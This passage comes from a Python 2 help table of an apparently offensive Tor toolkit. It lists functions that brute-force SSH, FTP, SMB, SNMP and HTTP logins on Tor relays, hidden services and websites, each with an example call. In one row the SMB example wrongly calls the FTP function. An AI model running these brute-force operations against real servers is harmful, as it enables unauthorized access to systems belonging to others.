                         ['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'],
                         ['setDictSeparator', 'Sets an separator for dictionary files. Every line en the file must contain <user><separator><passwd>.', 'self.setDictSeparator(":")'],
                         ['sshBruterOnRelay', 'Execute a bruteforce attack against an SSH Server in the relay entered. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnRelay('37.213.43.122', dictFile='/home/user/dict')"],
                         ['sshBruterOnAllRelays', 'Execute a bruteforce attack against an SSH Server in the relays founded. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnAllRelays(dictFile='/home/user/dict')"],
                         ['sshBruterOnHiddenService', 'Execute a bruteforce attack against an SSH Server in the onion address entered.', 'self.sshBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'],
                         ['ftpBruterOnRelay', 'Execute a bruteforce attack against an FTP Server in the relay entered.', 'self.ftpBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'],
                         ['ftpBruterOnAllRelays', 'Execute a bruteforce attack against an FTP Server in the relays founded.', 'self.ftpBruterOnAllRelays(dictFile="/home/user/dict")'],
                         ['ftpBruterOnHiddenService', 'Execute a bruteforce attack against an FTP Server in the onion address entered.', 'self.ftpBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'],
                         ['smbBruterOnRelay', 'Execute a bruteforce attack against an SMB Server in the relay entered.', 'self.smbBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'],
                         ['smbBruterOnAllRelays', 'Execute a bruteforce attack against an SMB Server in the relays founded.', 'self.ftpBruterOnAllRelays(dictFile="/home/user/dict")'],
                         ['smbBruterOnHiddenService', 'Execute a bruteforce attack against an SMB Server in the onion address entered. This function uses socat to create a local Socks proxy to route the requests from the local machine to the hidden service.', 'self.smbBruterOnHiddenService("5bsk3oj5jufsuii6.onion", servicePort=139, localPort=139, dictFile="/home/user/dict")'],
                         ['snmpBruterOnRelay', 'Execute a bruteforce attack against an SNMP Server in the relay entered.', 'self.snmpBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'],
                         ['snmpBruterOnAllRelays', 'Execute a bruteforce attack against an SNMP Server in the relays founded.', 'self.snmpBruterOnAllRelays(dictFile="/home/user/dict")'],
                         ['httpBruterOnSite', 'Execute a bruteforce attack against an web site.', 'self.httpBruterOnSite("http://eviltorrelay.com/auth/", dictFile="/home/user/dict")'],
                         ['httpBruterOnHiddenService', "Execute a bruteforce attack against an onion site (hidden service in TOR's deep web).", 'self.httpBruterOnHiddenService("http://5bsk3oj5jufsuii6.onion/auth/", dictFile="/home/user/dict")']
                        ])
        print table.draw() + "\n"
